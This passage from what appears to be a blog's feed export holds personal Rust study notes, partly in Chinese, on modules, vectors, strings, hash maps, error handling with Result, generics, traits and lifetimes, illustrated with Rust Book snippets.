<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub use crate::front_of_house::hosting;  //其他可以 另外创立一个链接</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::HashMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This is an absolute path starting with std, the name of the standard library crate.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">use rand::Rng;</span><br><span class="line">// --snip--</span><br><span class="line">use std::&#123;cmp::Ordering, io&#125;;</span><br><span class="line">// --snip--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::io::&#123;self, Write&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::collections::*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> brings all public items </p>
<p>The <code>mod</code> keyword declares modules, and Rust looks in a file with the same name as the module for the code that goes into that module.</p>
<h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v: Vec&lt;i32&gt; = Vec::new();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; //类别自己推测</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = Vec::new();</span><br><span class="line"></span><br><span class="line">    v.push(<span class="number">5</span>);</span><br><span class="line">    v.push(<span class="number">6</span>);</span><br><span class="line">    v.push(<span class="number">7</span>);</span><br><span class="line">    v.push(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        // do stuff with v</span><br><span class="line">    &#125; // &lt;- v goes out of scope and is freed here</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let v = vec![<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    let third: &amp;i32 = &amp;v[<span class="number">2</span>];</span><br><span class="line">    println!(<span class="string">&quot;The third element is &#123;&#125;&quot;</span>, third);</span><br><span class="line"></span><br><span class="line">    match v.get(<span class="number">2</span>) &#123; //gives us an Option&lt;&amp;<span class="built_in">T</span>&gt;.</span><br><span class="line">        Some(third) =&gt; println!(<span class="string">&quot;The third element is &#123;&#125;&quot;</span>, third),</span><br><span class="line">        None =&gt; println!(<span class="string">&quot;There is no third element.&quot;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut v = vec![<span class="number">100</span>, <span class="number">32</span>, <span class="number">57</span>];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> &amp;mut v &#123;</span><br><span class="line">        *i += <span class="number">50</span>; //解引用 dereference operator (*) to get to the value <span class="keyword">in</span> i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum SpreadsheetCell &#123;</span><br><span class="line">        Int(i32),</span><br><span class="line">        Float(f64),</span><br><span class="line">        Text(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let row = vec![  //vec类型为SpreadsheetCell 实际上存储不同类型值</span><br><span class="line">        SpreadsheetCell::Int(<span class="number">3</span>),</span><br><span class="line">        SpreadsheetCell::Text(String::from(<span class="string">&quot;blue&quot;</span>)),</span><br><span class="line">        SpreadsheetCell::Float(<span class="number">10.12</span>),</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>枚举要配合match使用</p>
<h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>Remember that<code>strings are UTF-8</code>encoded, </p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let hello = String::from(<span class="string">&quot;السلام عليكم&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Dobrý den&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;שָׁלוֹם&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;नमस्ते&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;こんにちは&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;안녕하세요&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;你好&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Olá&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Здравствуйте&quot;</span>);</span><br><span class="line">    let hello = String::from(<span class="string">&quot;Hola&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    s.push_str(<span class="string">&quot;bar&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    s.push(<span class="string">&#x27;l&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>push method takes<code>a single character</code></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">&quot;world!&quot;</span>);</span><br><span class="line">    let s3 = s1 + &amp;s2; // note s1 has been moved here and can no longer be used//be moved into the add <span class="built_in">call</span> and no longer be valid after that.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> add is that the compiler can coerce the &amp;String argument into a &amp;str</p>
<h4 id="format"><a href="#format" class="headerlink" title="format"></a>format</h4><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">&quot;tic&quot;</span>);</span><br><span class="line">    let s2 = String::from(<span class="string">&quot;tac&quot;</span>);</span><br><span class="line">    let s3 = String::from(<span class="string">&quot;toe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let s = format!(<span class="string">&quot;&#123;&#125;-&#123;&#125;-&#123;&#125;&quot;</span>, s1, s2, s3); //doesn’t take ownership of <span class="built_in">any</span> of its parameters.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utf-8 </code>可变字节 1-4字节，有些一个字节 有些4个字节</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">let hello = <span class="string">&quot;Здравствуйте&quot;</span>;</span><br><span class="line"></span><br><span class="line">let s = &amp;hello[<span class="number">0.</span>.4];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">c</span> <span class="keyword">in</span> <span class="string">&quot;नमस्ते&quot;</span>.chars() &#123;</span><br><span class="line">    println!(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="built_in">c</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&quot;नमस्ते&quot;</span>.bytes() &#123; // returns each raw byte,</span><br><span class="line">    println!(<span class="string">&quot;&#123;&#125;&quot;</span>, b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="hashmap"><a href="#hashmap" class="headerlink" title="hashmap"></a>hashmap</h3><p><code>all of the keys</code> must have the<code> same type</code>, and all of the<code>values</code>must have the<code> same type.</code></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Blue&quot;</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Yellow&quot;</span>), <span class="number">50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let teams = vec![String::from(<span class="string">&quot;Blue&quot;</span>), String::from(<span class="string">&quot;Yellow&quot;</span>)];</span><br><span class="line">    let initial_scores = vec![<span class="number">10</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    let mut scores: HashMap&lt;_, _&gt; =</span><br><span class="line">        teams.into_iter().zip(initial_scores.into_iter()).collect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>zip </code>method to create a vector of tuples<br><code>collect </code>method to turn that vector of tuples into a hash map,</p>
<p>For types that implement the <code>Copy trait</code>, like i32, the values<code> are copied into</code> the hash map. For owned values like String, the values will be moved and the hash map will be the <code>owner of those values</code></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line"></span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Blue&quot;</span>), <span class="number">10</span>);</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Yellow&quot;</span>), <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    let team_name = String::from(<span class="string">&quot;Blue&quot;</span>);</span><br><span class="line">    let score = scores.get(&amp;team_name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Some(&amp;10). The result is wrapped in Some because get returns an Option&lt;&amp;V&gt;<br>no value get will return None.</p>
<pre><code>for (key, value) in &amp;scores &#123;
    println!(&quot;&#123;&#125;: &#123;&#125;&quot;, key, value);
&#125;</code></pre>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let mut scores = HashMap::new();</span><br><span class="line">    scores.insert(String::from(<span class="string">&quot;Blue&quot;</span>), <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    scores.entry(String::from(<span class="string">&quot;Yellow&quot;</span>)).or_insert(<span class="number">50</span>);  //entry检查值是否存在，返回Entry， or_insert是Entry的方法 <span class="built_in">return</span> a mutable reference to the value   没有值插入</span><br><span class="line">    scores.entry(String::from(<span class="string">&quot;Blue&quot;</span>)).or_insert(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;&#123;:?&#125;&quot;</span>, scores); //&#123;<span class="string">&quot;Yellow&quot;</span>: <span class="number">50</span>, <span class="string">&quot;Blue&quot;</span>: <span class="number">10</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    use std::collections::HashMap;</span><br><span class="line"></span><br><span class="line">    let text = <span class="string">&quot;hello world wonderful world&quot;</span>;</span><br><span class="line"></span><br><span class="line">    let mut map = HashMap::new();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> text.split_whitespace() &#123;</span><br><span class="line">        let count = map.entry(word).or_insert(<span class="number">0</span>); //or_insert method actually returns a mutable reference (&amp;mut V) 所以可以加<span class="number">1</span></span><br><span class="line">        *count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;&#123;:?&#125;&quot;</span>, map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>RUST</tag>
      </tags>
  </entry>
  <entry>
    <title>RUST学习4</title>
    <url>/2020/08/14/RUST%E5%AD%A6%E4%B9%A04/</url>
    <content><![CDATA[<h3 id="Result-lt-T-E-gt"><a href="#Result-lt-T-E-gt" class="headerlink" title="Result&lt;T, E&gt;"></a>Result<code>&lt;T, E&gt;</code></h3><p>Rust doesn’t have exceptions. Instead, it has the type<code> Result&lt;T, E&gt;</code> for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. </p>
<p>When the <code>panic! </code>macro executes, your program will print a failure message, unwind and clean up the stack, and then quit. </p>
<a id="more"></a>
<p>result enum is defined as having two variants<code>, Ok and Err,</code></p>
<p>The Result&lt;T, E&gt; type has many helper methods defined on it to do various tasks. One of those methods, called <code>unwrap</code>, is a shortcut method that is implemented <code>just like the match </code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">&quot;hello.txt&quot;</span>).unwrap();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">&quot;hello.txt&quot;</span>).expect(<span class="string">&quot;Failed to open hello.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Propagating Errors</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">let f = File::open(<span class="string">&quot;hello.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let mut f = match f &#123;</span><br><span class="line">        Ok(file) =&gt; file,</span><br><span class="line">        Err(e) =&gt; <span class="keyword">return</span> Err(e),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>A Shortcut for Propagating Errors: the ? Operator<br>The<code>?</code>placed after a Result value is defined to work in almost the same way as the match expressions </p>
<p> If the value of the Result is an Ok, the value inside the Ok will get returned from this expression, and the program will continue. If the value is an Err, the Err will be returned from the whole function as if we had used the return keyword so the error value gets propagated to the calling code.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">File::open(<span class="string">&quot;hello.txt&quot;</span>)<span class="string">?.</span>read_to_string(&amp;mut s)?;</span><br><span class="line">Ok(s)</span><br></pre></td></tr></table></figure>


<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">    fs::read_to_string(<span class="string">&quot;hello.txt&quot;</span>)</span><br></pre></td></tr></table></figure>


<p> If you can ensure by manually inspecting the code that you’ll never have an Err variant, it’s perfectly acceptable to call<code> unwrap.</code> Here’s an example:</p>
<h3 id="Generic-泛型"><a href="#Generic-泛型" class="headerlink" title="Generic 泛型"></a>Generic 泛型</h3><p>将代码抽取出来，减少重复代码</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn largest&lt;T&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct Point&lt;T, U&gt; &#123; <span class="regexp">//</span>T U代表不同的类型</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let both_integer = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line">    let both_float = Point &#123; <span class="symbol">x:</span> <span class="number">1.0</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">    let integer_and_float = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>where T was filled in with the type std::fs::File when the file was opened successfully and E was filled in with the type std::io::Error when there were problems opening the file.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct Point&lt;T&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T&gt; Point&lt;T&gt; &#123;</span><br><span class="line">    fn x(&amp;<span class="keyword">self</span>) -&gt; &amp;T &#123;</span><br><span class="line">        &amp;<span class="keyword">self</span>.x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;p.x = &#123;&#125;&quot;</span>, p.x());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Note that we have to declare <code>T just after impl </code>so we can use it to specify that we’re implementing methods on the type Point<T>.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct Point&lt;T, U&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T, U&gt; Point&lt;T, U&gt; &#123;</span><br><span class="line">    fn mixup&lt;V, W&gt;(<span class="keyword">self</span>, <span class="symbol">other:</span> Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123;</span><br><span class="line">        Point &#123;</span><br><span class="line">            <span class="symbol">x:</span> <span class="keyword">self</span>.x,</span><br><span class="line">            <span class="symbol">y:</span> other.y,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p1 = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10.4</span> &#125;;</span><br><span class="line">    let p2 = Point &#123; <span class="symbol">x:</span> <span class="string">&quot;Hello&quot;</span>, <span class="symbol">y:</span> <span class="string">&#x27;c&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line">    let p3 = p1.mixup(p2);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;p3.x = &#123;&#125;, p3.y = &#123;&#125;&quot;</span>, p3.x, p3.y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="traits"><a href="#traits" class="headerlink" title="traits"></a>traits</h3><p>Different types share the same behavior if we can call the same methods on all of those types. Trait definitions are a way to group method signatures together to define a set of behaviors necessary to accomplish some purpose.</p>
<p>Each type implementing this trait must provide<code>its own custom behavior</code>for the body of the method.<br><code>相当于提供一个接口，具体内容自己实现</code><br>与Java一个概念类似</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123; <span class="regexp">//</span>添加trait到结构中</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">&quot;&#123;&#125;, by &#123;&#125; (&#123;&#125;)&quot;</span>, <span class="keyword">self</span>.headline, <span class="keyword">self</span>.author, <span class="keyword">self</span>.location)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Note that because we defined the Summary trait and the NewsArticle and Tweet types in the same lib.rs in Listing 10-13, they’re all in the same scope. Let’s say this lib.rs is for a crate we’ve called aggregator and someone else wants to use our crate’s functionality to implement the Summary trait on a struct defined within their library’s scope. They would need to bring the trait into their scope first. They would do so by specifying use <code>aggregator::Summary;</code>, which then would enable them to implement Summary for their type. The Summary trait would also need to be a public trait for another crate to implement it, which it is because we put the pub keyword before trait in Listing 10-12.</p>
<p>with trait implementations is that we can<code> implement a trait on a type only if either the trait or the type is local to our crate</code><br><code>can’t implement external traits on external types.</code></p>
<p>as we implement the trait on a particular type, we can keep or override each method’s default behavior.<br>specify an empty impl block with impl Summary for NewsArticle {}.</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        String::from(<span class="string">&quot;(Read more...)&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123;&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">&quot;&#123;&#125;: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Default implementations can call other methods in the same trait, even if those other methods don’t have a default implementation.</p>
<p>![allow(unused_variables)]<br>fn main() {<br>pub trait Summary {<br>    fn summarize_author(&amp;self) -&gt; String;</p>
<pre><code>fn summarize(&amp;self) -&gt; String &#123;
    format!(&quot;(Read more from &#123;&#125;...)&quot;, self.summarize_author())
&#125;</code></pre>
<p>}</p>
<p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p>
<p>impl Summary for Tweet {<br>    fn summarize_author(&amp;self) -&gt; String {<br>        format!(“@{}”, self.username)<br>    }<br>}<br>}</p>
<p>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p>
<p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p>
<p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}, by {} ({})”, self.headline, self.author, self.location)<br>    }<br>}</p>
<p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p>
<p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}: {}”, self.username, self.content)<br>    }<br>}</p>
<p>pub fn notify(item: &amp;impl Summary) {<br>    println!(“Breaking news! {}”, item.summarize());<br>}</p>
<h3 id="bound-trait"><a href="#bound-trait" class="headerlink" title="bound trait"></a>bound trait</h3><p>pub fn notify&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) {<br>传入的类型必须相同</p>
<pre><code>pub fn notify(item: &amp;(impl Summary + Display)) &#123;
pub fn notify&lt;T: Summary + Display&gt;(item: &amp;T) &#123;

fn some_function&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; i32
    where T: Display + Clone,
          U: Clone + Debug
&#123;</code></pre>
<p>an also use the impl Trait syntax in the return position to return a value of some type that implements a trait,<br>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p>
<p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p>
<p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}, by {} ({})”, self.headline, self.author, self.location)<br>    }<br>}</p>
<p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p>
<p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(“{}: {}”, self.username, self.content)<br>    }<br>}</p>
<p>fn returns_summarizable() -&gt; <code>impl Summary &#123;</code><br>    Tweet {<br>        username: String::from(“horse_ebooks”),<br>        content: String::from(<br>            “of course, as you probably already know, people”,<br>        ),<br>        reply: false,<br>        retweet: false,<br>    }<br>}</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn largest&lt;<span class="symbol">T:</span> PartialOrd + Copy&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123; <span class="regexp">//</span>限制只能传进i32 char等</span><br><span class="line">    let mut largest = list[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &amp;item <span class="keyword">in</span> list &#123;</span><br><span class="line">        <span class="keyword">if</span> item &gt; largest &#123;</span><br><span class="line">            largest = item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    largest</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fn main() {<br>    let number_list = vec![34, 50, 25, 100, 65];</p>
<pre><code>let result = largest(&amp;number_list);
println!(&quot;The largest number is &#123;&#125;&quot;, result);

let char_list = vec![&#39;y&#39;, &#39;m&#39;, &#39;a&#39;, &#39;q&#39;];

let result = largest(&amp;char_list);
println!(&quot;The largest char is &#123;&#125;&quot;, result);</code></pre>
<p>}</p>
<p>impl&lt;T: Display&gt; ToString for T {<br>    // –snip–<br>}</p>
<h3 id="The-Borrow-Checker"><a href="#The-Borrow-Checker" class="headerlink" title="The Borrow Checker"></a>The Borrow Checker</h3><p>we’ll add generic lifetime parameters that define the relationship between the references </p>
<p>lifetime<br>Lifetime annotations <code>don’t change</code> how long any of the references live. </p>
<pre><code>&amp;i32        // a reference
&amp;&#39;a i32     // a reference with an explicit lifetime
&amp;&#39;a mut i32 // a mutable reference with an explicit lifetime</code></pre>
<p>have a function with the parameter first that is a reference to an i32 with lifetime ‘a. The function also has another parameter named second that is another reference to an i32 that also has the lifetime ‘a. The lifetime annotations indicate that the references first and second must both live as long as that generic lifetime.</p>
